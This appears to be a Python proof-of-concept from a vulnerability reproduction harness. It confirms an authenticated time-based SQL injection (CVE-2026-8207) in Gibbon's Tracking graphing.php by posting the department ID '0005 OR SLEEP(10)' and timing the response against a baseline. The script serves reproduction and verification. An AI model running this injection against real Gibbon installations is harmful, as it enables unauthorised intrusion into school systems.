#!/usr/bin/env python3
"""Time-based proof for Gibbon v30.0.00 Tracking authenticated SQL injection.

The vulnerable code builds named PDO placeholders from POSTed department IDs.
We send a valid department that is not present in the fixture (0005, The Arts)
and a duplicate ID whose SQL fragment adds ``OR SLEEP(10)``. Because both
department predicates are false for the fixture's Science row, the injected
SLEEP is evaluated. The same request without SLEEP is the baseline.

Expected: baseline completes normally; injected request is delayed >= 8s.
"""

import json
import sys
import time

from case_client import GibbonClient

BASELINE_ID = "0005"
INJECTION = "0005 OR SLEEP(10)"
STUDENT_ID = "1875"


def timed_request(client, department_values):
    body = {
        "address": "",
        "dataType": "attainment",
        "gibbonDepartmentIDs[]": department_values,
        "gibbonPersonIDs[]": [STUDENT_ID],
    }
    started = time.monotonic()
    status, url, body = client.post("/index.php?q=/modules/Tracking/graphing.php", body)
    elapsed = time.monotonic() - started
    return status, elapsed, len(body), body


def main():
    client = GibbonClient()
    client.login()

    baseline_status, baseline_seconds, baseline_bytes, _ = timed_request(client, [BASELINE_ID])
    injected_status, injected_seconds, injected_bytes, injected_body = timed_request(
        client, [BASELINE_ID, INJECTION]
    )
    delta = injected_seconds - baseline_seconds
    vulnerable = injected_status == 200 and delta >= 8.0

    result = {
        "case": "CVE-2026-8207",
        "sink": "modules/Tracking/graphing.php SQL construction from gibbonDepartmentIDs[]",
        "baseline": {
            "department_ids": [BASELINE_ID],
            "http_status": baseline_status,
            "seconds": round(baseline_seconds, 2),
            "response_bytes": baseline_bytes,
        },
        "injected": {
            "department_ids": [BASELINE_ID, INJECTION],
            "http_status": injected_status,
            "seconds": round(injected_seconds, 2),
            "response_bytes": injected_bytes,
        },
        "delta_seconds": round(delta, 2),
        "threshold_seconds": 8.0,
        "result": "VULNERABLE" if vulnerable else "NOT_REPRODUCED",
    }
    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0 if vulnerable else 1


if __name__ == "__main__":
    sys.exit(main())
